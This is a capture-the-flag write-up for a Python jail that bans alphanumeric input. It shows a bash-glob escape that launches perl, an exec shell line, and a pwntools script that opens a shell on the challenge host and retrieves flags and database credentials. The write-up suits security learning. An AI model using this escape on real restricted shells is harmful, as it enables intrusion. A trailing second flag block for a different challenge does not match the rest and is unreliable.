## 21 - NoAlpha

### Description

**Solve**: 6/242
**Score**: 90

In the shadowed realm of Cyberton, a legendary Python jail known as "AlphanoNumera" stands, renowned for its unique security mechanism. Crafted by the enigmatic mastermind, Cipheron, this digital fortress allows bash commands—but with a twist. No alphanumeric characters are permitted within its virtual walls.

Source: [https://stdio-2026-public.2600.in.th/noalpha.zip](https://stdio-2026-public.2600.in.th/noalpha.zip)

Author: ErbaZZ

 `157.230.193.18:10021`

### Solution

```python
import re
import subprocess

while True:
    cmd = input('$ ')
    allowed_commands = ['echo', 'whoami', 'uname'] # TODO: Add other 'safe' commands

    check = cmd

    for command in allowed_commands:
        check = check.replace(command, '')

    if re.search(r'[a-zA-Z0-9!]', check) is None:
        try:
            subprocess.run(cmd, shell=True, executable='/bin/bash', env={'HOME':'/home/ctf'})
        except:
            print("?")
    else:
        print("Nope.")
```

Luckily if we look into a bash man page we can see that bash also allow pattern matching with `?` and `*` character which is similar to regex

```bash
$ nc 157.230.193.18 10021
$ echo *
bin boot dev etc home lib lib64 media mnt opt pg_hba.conf proc root run sbin srv start.sh sys tmp usr var
$ echo ???/???
bin/cat bin/dir bin/pwd bin/sed bin/tar dev/pts dev/shm dev/tty etc/apt etc/gss etc/opt etc/rmt etc/rpc etc/ssl lib/lsb sys/bus sys/dev usr/bin usr/lib usr/src var/lib var/log var/opt var/run var/tmp
$ echo ???/????
bin/bash bin/dash bin/date bin/echo bin/grep bin/gzip bin/more bin/stty bin/sync bin/true bin/vdir bin/zcat bin/zcmp bin/znew dev/core dev/full dev/null dev/ptmx dev/zero etc/dpkg etc/motd etc/perl etc/skel lib/init lib/udev run/lock run/utmp usr/sbin var/lock var/mail
$ ???/????
bin/dash: bin/dash: cannot execute binary file
```

Here we can see that if there's no match for a pattern, the pattern won't expand, but in case that there is a match it will expand to list of matched directories or files, and we can see that `/bin/bash ` which can be called with `???/????` but it will have other binary with the same pattern as arguments, which will cause an error

So, from this point it is likely that you have to find a program with unique pattern path, so we can call it properly, after couple of long minutes, here is what I found

```
$ echo ???/???/*
[...SNIPPED...] usr/bin/perl5.32-x86_64-linux-gnu usr/bin/perl5.32.1 usr/bin/perlbug usr/bin/perldoc [...SNIPPED...]
```

There's a `perl5.32.1` which is a scripting language interpreter which could be used to spawn shell and help us escape from jail, we can call it with `???/???/?????.??.?` since it have `.` in it we can specifically call it without match with any other binaries

```
$ echo ???/???/?????.??.?
usr/bin/perl5.32.1
```

According to https://gtfobins.github.io/gtfobins/perl/ we can spawn shell by using `'exec "/bin/sh";'`

```
$ ???/???/?????.??.?
exec "/bin/bash"
```

Unfortunately we have to also send EOF signal to the `perl` but with `nc` it won't be possible without some config, there probably many ways to go about sending EOF to `perl` in this challenge but for me I just going to use `pwntools`

```python
from pwn import *

io = remote('157.230.193.18', 10021)

io.sendlineafter(b'$', b'???/???/?????.??.?')
io.wait(0.1)
io.sendline(b'exec "/bin/bash"')
io.wait(0.1)
io.sendline(b'\x04')

io.interactive()
```

```bash
$ python shell.py
[+] Opening connection to 157.230.193.18 on port 10021: Done
[*] Switching to interactive mode
 $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
The flag is in a locally hosted postgresql database.

Database: flag
Username: ctf
Password: 4802691a4cfdc98ed215717cc8efb529
$ psql -h 127.0.0.1 -U ctf -d flag
Password for user ctf: $ 4802691a4cfdc98ed215717cc8efb529

$ select * from flag;
                     flag                     
----------------------------------------------
 STDIO23_21{810fc25e2373f4669ba5cc28eeec2c93}
(1 row)
```

And just like that, we get the flag `STDIO23_21{810fc25e2373f4669ba5cc28eeec2c93}`

```
stty -icanon; nc localhost 1337
```

```
$ cat /home/ctf/flag.txt
The flag is in a locally hosted postgresql database.

Database: flag
Username: ctf
Password: d2614ed6f67a6efa581f0dff855fd573
$ psql -h 127.0.0.1 -U ctf -d flag
Password for user ctf: $ d2614ed6f67a6efa581f0dff855fd573

$ select * from flag;
                     flag                     
----------------------------------------------
 STDIO23_22{d057108afbbf624d8e92c6a3f0900883}
```